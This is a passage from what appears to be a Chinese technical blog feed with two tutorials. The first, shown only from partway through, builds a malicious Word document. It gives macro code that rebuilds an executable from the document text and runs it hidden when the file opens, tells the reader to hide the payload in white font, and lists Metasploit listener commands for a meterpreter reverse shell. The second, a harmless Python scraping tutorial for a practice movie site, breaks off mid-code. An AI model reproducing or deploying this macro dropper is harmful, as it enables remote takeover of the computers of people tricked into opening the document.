class="hljs-variable">Ictso1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;mROEolRuRE.exe&quot;</span><br>        <span class="hljs-variable">Ictso2</span> <span class="hljs-operator">=</span> <span class="hljs-variable">Environ</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;USERPROFILE&quot;</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">ChDrive</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso2</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">ChDir</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso2</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">Ictso3</span> <span class="hljs-operator">=</span> <span class="hljs-variable">FreeFile</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-built_in">Open</span> <span class="hljs-variable">Ictso1</span> <span class="hljs-built_in">For</span> <span class="hljs-variable">Binary</span> <span class="hljs-variable">As</span> <span class="hljs-variable">Ictso3</span><br>        <span class="hljs-built_in">For</span> <span class="hljs-variable">Each</span> <span class="hljs-variable">Ictso4</span> <span class="hljs-variable">in</span> <span class="hljs-variable">ActiveDocument</span><span class="hljs-operator">.</span><span class="hljs-variable">Paragraphs</span><br>                <span class="hljs-variable">DoEvents</span><br>                        <span class="hljs-variable">Ictso11</span> <span class="hljs-operator">=</span> <span class="hljs-variable">Ictso4</span><span class="hljs-operator">.</span><span class="hljs-built_in">Range</span><span class="hljs-operator">.</span><span class="hljs-built_in">Text</span><br>                <span class="hljs-built_in">If</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso9</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">True</span><span class="hljs-punctuation">)</span> <span class="hljs-variable">Then</span><br>                        <span class="hljs-variable">Ictso8</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>                        <span class="hljs-built_in">While</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso8</span> <span class="hljs-operator">&lt;</span> <span class="hljs-variable">Len</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso11</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><br>                                <span class="hljs-variable">Ictso6</span> <span class="hljs-operator">=</span> <span class="hljs-variable">Mid</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso11</span><span class="hljs-operator">,</span><span class="hljs-variable">Ictso8</span><span class="hljs-operator">,</span><span class="hljs-number">4</span><span class="hljs-punctuation">)</span><br>                                <span class="hljs-built_in">Put</span> <span class="hljs-type">#Ictso3</span><span class="hljs-operator">,</span> <span class="hljs-operator">,</span> <span class="hljs-variable">Ictso6</span><br>                                <span class="hljs-variable">Ictso8</span> <span class="hljs-operator">=</span> <span class="hljs-variable">Ictso8</span> <span class="hljs-operator">+</span> <span class="hljs-number">4</span><br>                        <span class="hljs-variable">Wend</span><br>                <span class="hljs-variable">ElseIf</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">InStr</span><span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-operator">,</span><span class="hljs-variable">Ictso11</span><span class="hljs-operator">,</span><span class="hljs-variable">Ibhtnqbyoj</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span> <span class="hljs-built_in">And</span> <span class="hljs-variable">Len</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso11</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span><span class="hljs-punctuation">)</span> <span class="hljs-variable">Then</span><br>                        <span class="hljs-variable">Ictso9</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">True</span><br>                <span class="hljs-built_in">End</span> <span class="hljs-built_in">If</span><br>        <span class="hljs-built_in">Next</span><br>        <span class="hljs-built_in">Close</span> <span class="hljs-type">#Ictso3</span><br>        <span class="hljs-variable">Ictso13</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso1</span><span class="hljs-punctuation">)</span><br><span class="hljs-built_in">End</span> <span class="hljs-variable">Sub</span><br><br><span class="hljs-variable">Sub</span> <span class="hljs-variable">Ictso13</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso10</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">String</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso7</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">Integer</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso2</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">String</span><br>        <span class="hljs-variable">Ictso2</span> <span class="hljs-operator">=</span> <span class="hljs-variable">Environ</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;USERPROFILE&quot;</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">ChDrive</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso2</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">ChDir</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso2</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">Ictso7</span> <span class="hljs-operator">=</span> <span class="hljs-variable">Shell</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso10</span><span class="hljs-operator">,</span> <span class="hljs-variable">vbHide</span><span class="hljs-punctuation">)</span><br><span class="hljs-built_in">End</span> <span class="hljs-variable">Sub</span><br><br><span class="hljs-variable">Sub</span> <span class="hljs-variable">AutoOpen</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-type">Auto_Open</span><br><span class="hljs-built_in">End</span> <span class="hljs-variable">Sub</span><br><br><span class="hljs-variable">Sub</span> <span class="hljs-type">Workbook_Open</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-type">Auto_Open</span><br><span class="hljs-built_in">End</span> <span class="hljs-variable">Sub</span><br></code></pre></td></tr></table></figure><p>创建宏：</p><img src="/img/image-20230904203833597.png" alt="image-20230904203833597" style="zoom:67%;" /><p>粘贴msf生成的代码：</p><img src="/img/image-20230904203922388.png" alt="image-20230904203922388" style="zoom:67%;" /><p>保存为启用宏的文档：</p><img src="/img/image-20230904204054209.png" alt="image-20230904204054209" style="zoom:67%;" /><h4 id="2-复制payload"><a href="#2-复制payload" class="headerlink" title="2.复制payload"></a>2.复制payload</h4><img src="/img/image-20230904204246387.png" alt="image-20230904204246387" style="zoom:67%;" /><p>复制到word文档正文中</p><img src="/img/image-20230904204312614.png" alt="image-20230904204312614" style="zoom:67%;" /><p>将字体调成白色即可</p><h4 id="3-监听"><a href="#3-监听" class="headerlink" title="3.监听"></a>3.监听</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 10.210.100.128</span><br>run<br></code></pre></td></tr></table></figure><p>打开文档 – 启用宏</p><img src="/img/image-20230904204543498.png" alt="image-20230904204543498" style="zoom:67%;" />]]></content>
    
    
    <categories>
      
      <category>后渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>爬虫小项目1</title>
    <link href="/2023/10/07/%E7%88%AC%E8%99%AB%E5%B0%8F%E9%A1%B9%E7%9B%AE1/"/>
    <url>/2023/10/07/%E7%88%AC%E8%99%AB%E5%B0%8F%E9%A1%B9%E7%9B%AE1/</url>
    
    <content type="html"><![CDATA[<h1 id="爬虫小项目：爬取https-ssr1-scrape-center"><a href="#爬虫小项目：爬取https-ssr1-scrape-center" class="headerlink" title="爬虫小项目：爬取https://ssr1.scrape.center/"></a>爬虫小项目：爬取<a href="https://ssr1.scrape.center/">https://ssr1.scrape.center/</a></h1><p><img src="/img/image-20230929172430337.png" alt="image-20230929172430337"></p><p><img src="/img/image-20230929172522452.png" alt="image-20230929172522452"></p><h2 id="目标："><a href="#目标：" class="headerlink" title="目标："></a><strong>目标：</strong></h2><p>1.按列表顺序爬取每个电影详情页</p><p>2.利用正则提取海报、名称、类别、上映时间、评分、剧情简介</p><p>3.将爬取的内容保存下来</p><h2 id="网页分析："><a href="#网页分析：" class="headerlink" title="网页分析："></a><strong>网页分析：</strong></h2><p><img src="/img/image-20230930145223731.png" alt="image-20230930145223731"></p><p>海报和标题都有跳转到详情页的链接&#x2F;detail&#x2F;1</p><p><img src="/img/image-20230930145514680.png" alt="image-20230930145514680"></p><p>页码url为&#x2F;page&#x2F;3    一共10页</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a><strong>实现</strong></h2><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-number">1.</span>遍历所有页码，拼接<span class="hljs-built_in">url</span><br><span class="hljs-number">2.</span>拿到详情页页面的<span class="hljs-built_in">url</span><br><span class="hljs-number">3.</span>在详情页面用正则匹配出需要的内容<br><span class="hljs-number">4</span>，保存数据<br></code></pre></td></tr></table></figure><p>需要匹配详情页的标签：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">data-v-7f856186</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;/detail/1&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">data-v-7f856186</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;/detail/2&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;&lt;/a&gt;<br><br>正则：<br>&lt;a.*<span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;(.*?)&quot;</span>.*?class=&quot;name&quot;&gt;<br></code></pre></td></tr></table></figure><p>非贪婪模式：</p><img src="/img/image-20230930154636668.png" alt="image-20230930154636668" style="zoom:67%;" /><h3 id="第一步：获取到所有的详情页链接"><a href="#第一步：获取到所有的详情页链接" class="headerlink" title="第一步：获取到所有的详情页链接"></a>第一步：获取到所有的详情页链接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">import</span> pymongo<br><br><span class="hljs-comment">#1.配置日志</span><br>logging.basicConfig(level=logging.INFO,<br>                    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)<br><br><br>BASE_URL = <span class="hljs-string">&quot;https://ssr1.scrape.center&quot;</span><br>TOTAL_PAGE = <span class="hljs-number">10</span><br><br><span class="hljs-comment">#2.抓取某一页面的内容</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_index</span>(<span class="hljs-params">page</span>):<br>    index_url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;BASE_URL&#125;</span>/page/<span class="hljs-subst">&#123;page&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> scrape_page(index_url)<br><br><span class="hljs-comment">#定义函数抓取网页的内容</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_page</span>(<span class="hljs-params">url</span>):<br>    logging.info(<span class="hljs-string">&quot;正在抓取 %s......&quot;</span>,url)<br>    <span class="hljs-comment">#发起get请求</span><br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">else</span>:<br>            logging.error(<span class="hljs-string">&quot;爬取%s时返回无效的状态码%s&quot;</span> % (url,response.status_code))<br>    <span class="hljs-keyword">except</span> requests.RequestException:<br>        <span class="hljs-comment">#如果发生异常就报错  </span><br>        <span class="hljs-comment"># exc_info=True用于日志记录异常信息时，会将异常类型 值 回溯信息 堆栈跟踪等都返回</span><br>        logging.error(<span class="hljs-string">&quot;爬取%s发生异常&quot;</span> % url,exc_info=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment">#解析内容，提取出详情页面的url</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_index</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则提取详情页面的链接</span><br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;a.*href=&quot;(.*?)&quot;.*?class=&quot;name&quot;&gt;&#x27;</span>)<br>    items = re.findall(pattern,html)<br>    <span class="hljs-comment">#print(items)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> items:<br>        <span class="hljs-keyword">return</span> []<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-comment">#把相对链接转为绝对链接</span><br>        detail_url = urljoin(BASE_URL,item)<br>        <span class="hljs-comment">#print(detail_url)</span><br>        logging.info(<span class="hljs-string">&quot;找到详情页，链接%s&quot;</span>%detail_url)<br>        <span class="hljs-comment">#返回一个生成器 可以使用for循环或者调用next()方法遍历生成器对象来提取结果</span><br>        <span class="hljs-keyword">yield</span> detail_url    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,TOTAL_PAGE+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment">#抓取某个页面的内容</span><br>        index_html = scrape_index(page)<br>        <span class="hljs-comment">#抓取该页面上跳转详情页的链接</span><br>        details_urls = parse_index(index_html)<br>        <span class="hljs-comment">#print(list(details_urls))</span><br>        logging.info(<span class="hljs-string">&quot;详情页面链接%s&quot;</span>,<span class="hljs-built_in">list</span>(details_urls))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230930161236158.png" alt="image-20230930161236158"></p><h3 id="第二步：爬取详情页信息"><a href="#第二步：爬取详情页信息" class="headerlink" title="第二步：爬取详情页信息"></a>第二步：爬取详情页信息</h3><p>分析：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">1.</span>图片：img标签<br><span class="hljs-number">2.</span>类别：两个button里的span标签<br><span class="hljs-number">3.</span>上映时间：div里的span标签<br><span class="hljs-number">4.</span>评分：p标签<br><span class="hljs-number">5.</span>剧情简介：div <span class="hljs-keyword">class</span>=<span class="hljs-symbol">drama</span>里的<span class="hljs-symbol">p</span>标签<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230930163136158.png" alt="image-20230930163136158"></p><p>正则测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> re<br><br><br><span class="hljs-comment">#1.url</span><br><span class="hljs-comment"># txt = &#x27;&lt;img data-v-63864230=&quot;&quot; src=&quot;https://p0.meituan.net/movie/ce4da3e03e655b5b88ed31b5cd7896cf62472.jpg@464w_644h_1e_1c&quot; class=&quot;cover&quot;&gt;&#x27;</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;class=&quot;el-col.*?&lt;img.*?src=&quot;(.*?)&quot;.*?class=&quot;cover&quot;&gt;&#x27;,re.S)</span><br><span class="hljs-comment"># response = re.search(pattern,txt).group(1).split(&#x27;@&#x27;)</span><br><span class="hljs-comment"># print(response[0])</span><br><br><span class="hljs-comment">#2.种类</span><br><span class="hljs-comment"># txt = &#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#     &lt;div data-v-63864230=&quot;&quot; class=&quot;categories&quot;&gt;</span><br>                <br><span class="hljs-comment">#                 &lt;button data-v-7f856186=&quot;&quot; type=&quot;button&quot; class=&quot;el-button category el-button--primary el-button--mini&quot;&gt;</span><br><span class="hljs-comment">#                   &lt;span&gt;剧情&lt;/span&gt;</span><br><span class="hljs-comment">#                 &lt;/button&gt;</span><br>                <br><span class="hljs-comment">#                 &lt;button data-v-7f856186=&quot;&quot; type=&quot;button&quot; class=&quot;el-button category el-button--primary el-button--mini&quot;&gt;</span><br><span class="hljs-comment">#                   &lt;span&gt;爱情&lt;/span&gt;</span><br><span class="hljs-comment">#                 &lt;/button&gt;</span><br>                <br><span class="hljs-comment">#               &lt;/div&gt;</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># #注意这里要加上re.S  .任意匹配  包括换行符</span><br><span class="hljs-comment"># #因为.是匹配除了换行符之外的任意字符</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;&lt;button.*?category.*?&lt;span&gt;(.*?)&lt;/span&gt;.*?&lt;/button&gt;&#x27;,re.S)</span><br><span class="hljs-comment"># response = re.findall(pattern,txt)</span><br><span class="hljs-comment"># print(response)</span><br><br><br><span class="hljs-comment">#3.上映时间</span><br><span class="hljs-comment"># txt = &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># &lt;div data-v-7f856186=&quot;&quot; class=&quot;m-v-sm info&quot;&gt;</span><br>                <br><span class="hljs-comment">#                 &lt;span data-v-7f856186=&quot;&quot;&gt;1993-07-26 上映&lt;/span&gt;</span><br>                <br><span class="hljs-comment">#               &lt;/div&gt;</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125; 上映&#x27;)</span><br><span class="hljs-comment"># response = re.search(pattern,txt).group(0).split(&#x27; &#x27;)</span><br><span class="hljs-comment"># print(response[0])</span><br><br><span class="hljs-comment">#评分</span><br><span class="hljs-comment"># txt = &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># &lt;div data-v-63864230=&quot;&quot; class=&quot;el-col el-col-24 el-col-xs-8 el-col-sm-4&quot;&gt;&lt;p data-v-63864230=&quot;&quot;</span><br><span class="hljs-comment">#                                                                                         class=&quot;score m-t-md m-b-n-sm&quot;&gt;</span><br><span class="hljs-comment">#               9.5&lt;/p&gt;</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;&lt;p.*?score.*?&gt;(.*?)&lt;/p&gt;&#x27;,re.S)</span><br><span class="hljs-comment"># response = re.search(pattern,txt).group(1).split()</span><br><span class="hljs-comment"># print(response[0])</span><br><br><br><span class="hljs-comment">#剧情简介</span><br>txt = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;div data-v-63864230=&quot;&quot; class=&quot;drama&quot;&gt;&lt;h3 data-v-63864230=&quot;&quot;&gt;剧情简介&lt;/h3&gt;</span><br><span class="hljs-string">                &lt;p data-v-63864230=&quot;&quot;&gt;</span><br><span class="hljs-string">                  影片借一出《霸王别姬》的京戏，牵扯出三个人之间一段随时代风云变幻的爱恨情仇。段小楼（张丰毅 饰）与程蝶衣（张国荣 饰）是一对打小一起长大的师兄弟，两人一个演生，一个饰旦，一向配合天衣无缝，尤其一出《霸王别姬》，更是誉满京城，为此，两人约定合演一辈子《霸王别姬》。但两人对戏剧与人生关系的理解有本质不同，段小楼深知戏非人生，程蝶衣则是人戏不分。段小楼在认为该成家立业之时迎娶了名妓菊仙（巩俐 饰），致使程蝶衣认定菊仙是可耻的第三者，使段小楼做了叛徒，自此，三人围绕一出《霸王别姬》生出的爱恨情仇战开始随着时代风云的变迁不断升级，终酿成悲剧。</span><br><span class="hljs-string">                &lt;/p&gt;&lt;/div&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;div.*?drama.*?&gt;.*?&lt;p.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>response = re.search(pattern,txt).group(<span class="hljs-number">1</span>).strip()<br><span class="hljs-built_in">print</span>(response)<br><br><span class="hljs-comment">#名称</span><br><span class="hljs-comment"># txt = &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># &lt;div data-v-63864230=&quot;&quot; class=&quot;p-h el-col el-col-24 el-col-xs-16 el-col-sm-12&quot;&gt;</span><br><span class="hljs-comment">#               &lt;a data-v-63864230=&quot;&quot;</span><br><span class="hljs-comment">#                  class=&quot;router-link-exact-active router-link-active&quot;&gt;</span><br><span class="hljs-comment">#                 &lt;h2 data-v-63864230=&quot;&quot; class=&quot;m-b-sm&quot;&gt;霸王别姬 - Farewell My Concubine&lt;/h2&gt;&lt;/a&gt;</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;&lt;h2.*?m-b-sm.*?&gt;(.*?)&lt;/h2&gt;&#x27;,re.S)</span><br><span class="hljs-comment"># response = re.search(pattern,txt).group(1)</span><br><span class="hljs-comment"># print(response)</span><br></code></pre></td></tr></table></figure><p><strong>实现获取指定页每个电影详情页信息的代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#coding:utf-8</span><br><br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">import</span> pymongo<br><br><span class="hljs-comment">#1.配置日志</span><br>logging.basicConfig(level=logging.INFO,<br>                    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)<br><br><br>BASE_URL = <span class="hljs-string">&quot;https://ssr1.scrape.center&quot;</span><br>TOTAL_PAGE = <span class="hljs-number">10</span><br><br><span class="hljs-comment">#2.抓取某一列表页面的内容 返回html源码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_index</span>(<span class="hljs-params">page</span>):<br>    index_url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;BASE_URL&#125;</span>/page/<span class="hljs-subst">&#123;page&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> scrape_page(index_url)<br><br><span class="hljs-comment">#定义函数抓取网页的内容 返回html源码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_page</span>(<span class="hljs-params">url</span>):<br>    logging.info(<span class="hljs-string">&quot;正在抓取 %s......&quot;</span>,url)<br>    <span class="hljs-comment">#发起get请求</span><br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">else</span>:<br>            logging.error(<span class="hljs-string">&quot;爬取%s时返回无效的状态码%s&quot;</span> % (url,response.status_code))<br>    <span class="hljs-keyword">except</span> requests.RequestException:<br>        